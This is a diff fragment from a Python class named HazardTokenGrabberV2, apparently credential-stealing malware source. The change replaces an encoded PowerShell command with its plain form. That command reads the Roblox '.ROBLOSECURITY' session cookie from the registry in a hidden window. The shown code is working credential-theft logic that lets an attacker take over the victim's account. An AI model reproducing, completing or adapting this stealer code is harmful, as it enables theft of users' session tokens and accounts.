@@ -553,7 +553,7 @@ class HazardTokenGrabberV2(Functions):
         def subproc(path):
             try:
                 return subprocess.check_output(
-                    fr"powershell -encodedCommand RwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQBWAGEAbAB1AGUAIAAtAFAAYQB0AGgAIAB7AHAAYQB0AGgAfQA6AFMATwBGAFQAVwBBAFIARQBcAFIAbwBiAGwAbwB4AFwAUgBvAGIAbABvAHgAUwB0AHUAZABpAG8AQgByAG8AdwBzAGUAcgBcAHIAbwBiAGwAbwB4AC4AYwBvAG0AIAAtAE4AYQBtAGUAIAAuAFIATwBCAEwATwBTAEUAQwBVAFIASQBUAFkA",
+                    fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
                     creationflags=0x08000000).decode().rstrip()
             except Exception:
                 return None
